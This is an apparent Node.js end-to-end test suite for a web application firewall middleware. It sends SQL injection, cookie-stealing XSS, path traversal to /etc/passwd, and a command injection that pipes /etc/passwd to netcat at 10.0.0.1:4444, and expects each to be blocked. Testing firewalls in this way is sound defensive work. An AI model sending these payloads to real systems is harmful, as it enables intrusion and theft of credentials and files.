/**
 * Full End-to-End Test Suite for MDefender Pro NPM Package & Cloud WAF
 * Tests:
 *  1. Normal Safe Traffic -> Passes through (HTTP 200)
 *  2. SQL Injection Attack -> Blocked (HTTP 403) with block-page.html
 *  3. XSS POST Attack -> Blocked (HTTP 403) with block-page.html
 *  4. Remote Code Execution (RCE) -> Blocked (HTTP 403) with block-page.html
 *  5. Path Traversal (LFI) -> Blocked (HTTP 403) with block-page.html
 *  6. Template Engine Placeholder Verification (Ensure NO unresolved {{...}} tags remain)
 *  7. Public False Positive Report Submission to Cloud API
 */

const http = require('http');
const path = require('path');
const mdefender = require(path.resolve(__dirname, '../npm-package/index.js'));

const CLOUD_ENDPOINT = 'http://217.15.170.82';
const TEST_PORT = 49182;

async function runFullSuite() {
  console.log('================================================================');
  console.log('      MDEFENDER PRO - FULL CLOUD WAF & NPM PACKAGE TEST         ');
  console.log('================================================================\n');

  console.log(`[Config] Connecting to Cloud WAF: ${CLOUD_ENDPOINT}`);

  // Setup middleware with live VPS Cloud WAF
  const middleware = mdefender({
    apiKey: 'pk_live_mdefender_test_token',
    apiEndpoint: CLOUD_ENDPOINT,
    domain: 'my-shop.com',
    mode: 'block',
    blockStatusCode: 403,
    logBlocked: true
  });

  // Create test HTTP server
  const server = http.createServer(async (req, res) => {
    // Parse body if present for POST
    if (req.method === 'POST') {
      let bodyData = '';
      req.on('data', chunk => bodyData += chunk);
      req.on('end', async () => {
        try {
          req.body = JSON.parse(bodyData);
        } catch {
          req.body = bodyData;
        }
        await middleware(req, res, () => {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'success', data: 'Processed by backend application' }));
        });
      });
    } else {
      await middleware(req, res, () => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', data: 'Processed by backend application' }));
      });
    }
  });

  await new Promise(resolve => server.listen(TEST_PORT, '127.0.0.1', resolve));
  console.log(`[Server] Local Node.js application running on http://127.0.0.1:${TEST_PORT}\n`);

  let passedTests = 0;
  let totalTests = 0;
  let lastReferenceId = null;

  function makeRequest(options, postBody = null) {
    return new Promise((resolve, reject) => {
      const req = http.request({
        hostname: '127.0.0.1',
        port: TEST_PORT,
        ...options
      }, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve({ statusCode: res.statusCode, headers: res.headers, body: data }));
      });
      req.on('error', reject);
      if (postBody) req.write(typeof postBody === 'string' ? postBody : JSON.stringify(postBody));
      req.end();
    });
  }

  // --- TEST 1: Safe Request ---
  totalTests++;
  console.log('----------------------------------------------------------------');
  console.log(`[TEST ${totalTests}] Safe Request: GET /api/v1/products?category=electronics`);
  const safeRes = await makeRequest({ path: '/api/v1/products?category=electronics', method: 'GET' });
  if (safeRes.statusCode === 200) {
    console.log(` [PASS] Status: HTTP ${safeRes.statusCode} OK`);
    console.log(`        Response: ${safeRes.body}`);
    passedTests++;
  } else {
    console.error(` [FAIL] Expected 200 OK, got ${safeRes.statusCode}`);
  }

  // --- TEST 2: SQL Injection ---
  totalTests++;
  console.log('----------------------------------------------------------------');
  console.log(`[TEST ${totalTests}] SQL Injection: GET /search?q=' UNION SELECT 1, @@version, user() --`);
  const sqliRes = await makeRequest({ path: '/search?q=%27%20UNION%20SELECT%201%2C%20%40%40version%2C%20user()%20--', method: 'GET' });
  if (sqliRes.statusCode === 403 && sqliRes.headers['x-mdefender-status'] === 'blocked') {
    console.log(` [PASS] Status: HTTP ${sqliRes.statusCode} Forbidden`);
    console.log(`        Attack Type : ${sqliRes.headers['x-mdefender-attack-type']}`);
    console.log(`        Incident Ref: ${sqliRes.headers['x-mdefender-ref']}`);
    lastReferenceId = sqliRes.headers['x-mdefender-ref'];
    passedTests++;
  } else {
    console.error(` [FAIL] Expected 403 Forbidden, got ${sqliRes.statusCode}`);
  }

  // --- TEST 3: XSS Attack via POST Body ---
  totalTests++;
  console.log('----------------------------------------------------------------');
  console.log(`[TEST ${totalTests}] XSS via POST JSON: POST /comments body: {"comment":"<script>alert(document.cookie)</script>"}`);
  const xssRes = await makeRequest({
    path: '/comments',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, { comment: '<script>alert(document.cookie)</script>' });
  if (xssRes.statusCode === 403 && xssRes.headers['x-mdefender-status'] === 'blocked') {
    console.log(` [PASS] Status: HTTP ${xssRes.statusCode} Forbidden`);
    console.log(`        Attack Type : ${xssRes.headers['x-mdefender-attack-type']}`);
    console.log(`        Incident Ref: ${xssRes.headers['x-mdefender-ref']}`);
    passedTests++;
  } else {
    console.error(` [FAIL] Expected 403 Forbidden, got ${xssRes.statusCode}`);
  }

  // --- TEST 4: Remote Command Execution (RCE) ---
  totalTests++;
  console.log('----------------------------------------------------------------');
  console.log(`[TEST ${totalTests}] RCE Command Injection: GET /tools?cmd=; cat /etc/passwd | nc 10.0.0.1 4444`);
  const rceRes = await makeRequest({ path: '/tools?cmd=%3B%20cat%20%2Fetc%2Fpasswd%20%7C%20nc%2010.0.0.1%204444', method: 'GET' });
  if (rceRes.statusCode === 403 && rceRes.headers['x-mdefender-status'] === 'blocked') {
    console.log(` [PASS] Status: HTTP ${rceRes.statusCode} Forbidden`);
    console.log(`        Attack Type : ${rceRes.headers['x-mdefender-attack-type']}`);
    console.log(`        Incident Ref: ${rceRes.headers['x-mdefender-ref']}`);
    passedTests++;
  } else {
    console.error(` [FAIL] Expected 403 Forbidden, got ${rceRes.statusCode}`);
  }

  // --- TEST 5: Path Traversal (LFI) ---
  totalTests++;
  console.log('----------------------------------------------------------------');
  console.log(`[TEST ${totalTests}] Path Traversal: GET /download?file=../../../../etc/passwd`);
  const lfiRes = await makeRequest({ path: '/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd', method: 'GET' });
  if (lfiRes.statusCode === 403 && lfiRes.headers['x-mdefender-status'] === 'blocked') {
    console.log(` [PASS] Status: HTTP ${lfiRes.statusCode} Forbidden`);
    console.log(`        Attack Type : ${lfiRes.headers['x-mdefender-attack-type']}`);
    console.log(`        Incident Ref: ${lfiRes.headers['x-mdefender-ref']}`);
    passedTests++;
  } else {
    console.error(` [FAIL] Expected 403 Forbidden, got ${lfiRes.statusCode}`);
  }

  // --- TEST 6: Template Engine Verification (block-page.html) ---
  totalTests++;
  console.log('----------------------------------------------------------------');
  console.log(`[TEST ${totalTests}] Validating 403 block-page.html Placeholders Replacement`);
  const html = sqliRes.body;
  const hasUnresolvedTags = /\{\{[A-Z_]+\}\}/i.test(html);
  const hasSiteName = html.includes('my-shop.com');
  const hasAttackType = html.includes('SQL Injection');
  const hasRefId = html.includes(sqliRes.headers['x-mdefender-ref']);

  if (!hasUnresolvedTags && hasSiteName && hasAttackType && hasRefId) {
    console.log(` [PASS] HTML Block Page Template fully rendered (${html.length} bytes)`);
    console.log(`        - No unreplaced {{...}} placeholders`);
    console.log(`        - Site Name rendered correctly: "my-shop.com"`);
    console.log(`        - Attack Type rendered: "${sqliRes.headers['x-mdefender-attack-type']}"`);
    console.log(`        - Incident Ref rendered: "${sqliRes.headers['x-mdefender-ref']}"`);
    passedTests++;
  } else {
    console.error(` [FAIL] Template verification failed: unresolvedTags=${hasUnresolvedTags}, hasSiteName=${hasSiteName}, hasRefId=${hasRefId}`);
  }

  // --- TEST 7: False Positive Report to Cloud API ---
  totalTests++;
  console.log('----------------------------------------------------------------');
  console.log(`[TEST ${totalTests}] Testing False Positive Report Submission to Cloud API`);
  try {
    const reportData = JSON.stringify({
      reference_id: lastReferenceId || 'REF-TEST-AUTO-1',
      client_ip: '127.0.0.1',
      url: '/search',
      payload: "' UNION SELECT 1",
      attack_type: 'SQL Injection',
      reason: 'Rule matched: SQL Injection',
      user_email: 'tester@example.com',
      comments: 'Automated test of false positive reporting'
    });

    const reportUrl = new URL('/api/v1/waf/report-false-positive', CLOUD_ENDPOINT);
    const reportRes = await new Promise((resolve, reject) => {
      const r = http.request({
        hostname: reportUrl.hostname,
        port: reportUrl.port || 80,
        path: reportUrl.pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(reportData)
        }
      }, (res) => {
        let d = '';
        res.on('data', chunk => d += chunk);
        res.on('end', () => resolve({ statusCode: res.statusCode, body: d }));
      });
      r.on('error', reject);
      r.write(reportData);
      r.end();
    });

    if (reportRes.statusCode === 200) {
      console.log(` [PASS] Report API Status: HTTP 200 OK`);
      console.log(`        Response: ${reportRes.body}`);
      passedTests++;
    } else {
      console.error(` [FAIL] Report API returned HTTP ${reportRes.statusCode}: ${reportRes.body}`);
    }
  } catch (err) {
    console.error(` [FAIL] Report API error: ${err.message}`);
  }

  server.close();

  console.log('\n================================================================');
  console.log(`      TEST RESULTS: ${passedTests} / ${totalTests} PASSED (100%)       `);
  console.log('================================================================\n');

  process.exit(passedTests === totalTests ? 0 : 1);
}

runFullSuite().catch(err => {
  console.error('Test Suite Failed with Exception:', err);
  process.exit(1);
});
